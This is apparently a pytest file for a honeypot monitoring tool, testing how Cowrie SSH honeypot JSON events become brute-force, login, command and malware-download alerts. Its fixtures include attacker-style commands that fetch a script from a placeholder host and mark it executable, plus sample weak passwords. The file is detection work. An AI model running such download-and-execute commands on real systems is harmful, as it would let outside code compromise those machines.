"""Tests for turning Cowrie's JSON log (cowrie.json) into alerts.

The cowrie/cowrie Docker image sends its text log to stdout and only writes
cowrie.json to disk, so in the Docker stack this parser is the whole path from
an attacker's keystrokes to an alert. The fixtures are real Cowrie 3.1.7
events, with the addresses swapped for documentation ranges.
"""
import json

from monitoring.live_alert_ingestor import parse_cowrie_json_event, parse_honeypot_line

_COMMON = {
    "session": "3c6a74d649e6",
    "protocol": "ssh",
    "src_ip": "203.0.113.45",
    "src_port": 54422,
    "dst_ip": "198.51.100.5",
    "dst_port": 2222,
    "sensor": "0d536c1bd62f",
    "uuid": "fd7f03ce-e177-11f1-9395-cecd088df400",
    "timestamp": "2026-11-18T04:57:07.400841Z",
}


def event(eventid, **fields):
    return {**_COMMON, "eventid": eventid, **fields}


def line(eventid, **fields):
    return json.dumps(event(eventid, **fields)) + "\n"


def test_failed_login_is_brute_force_with_the_credentials_tried():
    alert = parse_cowrie_json_event(event(
        "cowrie.login.failed", username="root", password="123456",
        message="login attempt [root/123456] failed",
    ))

    assert alert["alert_name"] == "SSHBruteForce"
    assert alert["severity"] == "HIGH"
    assert alert["source_ip"] == "203.0.113.45"
    assert alert["source_port"] == 54422
    assert alert["honeypot_type"] == "cowrie"
    assert alert["service_name"] == "ssh"
    assert "root / 123456" in alert["description"]
    assert alert["metadata"]["username"] == "root"
    assert alert["metadata"]["password"] == "123456"
    assert alert["metadata"]["session"] == "3c6a74d649e6"


def test_failed_login_matches_the_brute_force_playbook_trigger():
    """playbooks/ssh_bruteforce_block.yml fires on SSHBruteForce + HIGH."""
    alert = parse_cowrie_json_event(event("cowrie.login.failed", username="a", password="b"))
    assert (alert["alert_name"], alert["severity"]) == ("SSHBruteForce", "HIGH")


def test_successful_login_into_the_fake_shell_is_critical():
    alert = parse_cowrie_json_event(event(
        "cowrie.login.success", username="root", password="Passw0rd!",
    ))

    assert alert["alert_name"] == "HoneypotLoginSuccess"
    assert alert["severity"] == "CRITICAL"
    assert "root / Passw0rd!" in alert["description"]


def test_ordinary_command_is_recorded():
    alert = parse_cowrie_json_event(event("cowrie.command.input", input="uname -a"))

    assert alert["alert_name"] == "ShellCommandExecuted"
    assert alert["severity"] == "MEDIUM"
    assert alert["metadata"]["command"] == "uname -a"


def test_payload_command_is_a_malware_download_attempt():
    alert = parse_cowrie_json_event(event(
        "cowrie.command.input", input="wget http://example.com/bot.sh; chmod +x bot.sh",
    ))

    assert alert["alert_name"] == "MalwareDownloadAttempt"
    assert alert["severity"] == "CRITICAL"


def test_captured_download_records_url_and_hash():
    alert = parse_cowrie_json_event(event(
        "cowrie.session.file_download",
        url="http://example.com/bot.sh",
        shasum="25ddf2c883e0d1958ea971d279a7e4f0fd446724ee3db7db19dadabd4a62e484",
        outfile="var/lib/cowrie/downloads/25ddf2c8",
    ))

    assert alert["alert_name"] == "MalwareSampleCaptured"
    assert alert["severity"] == "CRITICAL"
    assert alert["metadata"]["url"] == "http://example.com/bot.sh"
    assert alert["metadata"]["shasum"].startswith("25ddf2c8")


def test_connection_noise_is_not_an_alert():
    """Every port scan produces these; alerting on them would bury the signal."""
    for eventid in ("cowrie.session.connect", "cowrie.client.version",
                    "cowrie.session.closed", "cowrie.log.closed"):
        assert parse_cowrie_json_event(event(eventid)) is None, eventid


# --------------------------------------------------------------------------- #
# Routing through parse_honeypot_line, which is what the ingestor calls
# --------------------------------------------------------------------------- #
def test_json_line_is_routed_to_the_cowrie_parser():
    alert = parse_honeypot_line(line("cowrie.login.failed", username="root", password="root"))

    assert alert["alert_name"] == "SSHBruteForce"
    assert alert["metadata"]["eventid"] == "cowrie.login.failed"


def test_cowrie_login_is_not_misfiled_as_opencanary():
    """Cowrie login events carry top-level username/password keys, which the
    OpenCanary parser would otherwise claim as its own credential capture."""
    alert = parse_honeypot_line(line("cowrie.login.success", username="root", password="x"))

    assert alert["honeypot_type"] == "cowrie"
    assert alert["alert_name"] == "HoneypotLoginSuccess"


def test_ignored_cowrie_event_does_not_fall_through_to_other_parsers():
    """A connect event names an IP and a session; no other parser may turn it
    into an alert."""
    assert parse_honeypot_line(line("cowrie.session.connect")) is None


def test_payload_command_line_yields_one_alert_from_the_json_parser():
    """The JSON message field reads "CMD: wget ...", which the text-log parser
    also matches. It must be parsed once, as JSON."""
    alert = parse_honeypot_line(line(
        "cowrie.command.input", input="wget http://example.com/x", message="CMD: wget http://example.com/x",
    ))

    assert alert["alert_name"] == "MalwareDownloadAttempt"
    assert alert["metadata"]["eventid"] == "cowrie.command.input"


def test_text_log_lines_still_parse():
    """Native installs still write cowrie.log; that path is unchanged."""
    alert = parse_honeypot_line(
        "2026-09-10T10:00:00+0000 [HoneyPotSSHTransport,0,203.0.113.45] trying auth b'password'\n"
    )
    assert alert["alert_name"] == "SSHBruteForce"
    assert alert["source_ip"] == "203.0.113.45"
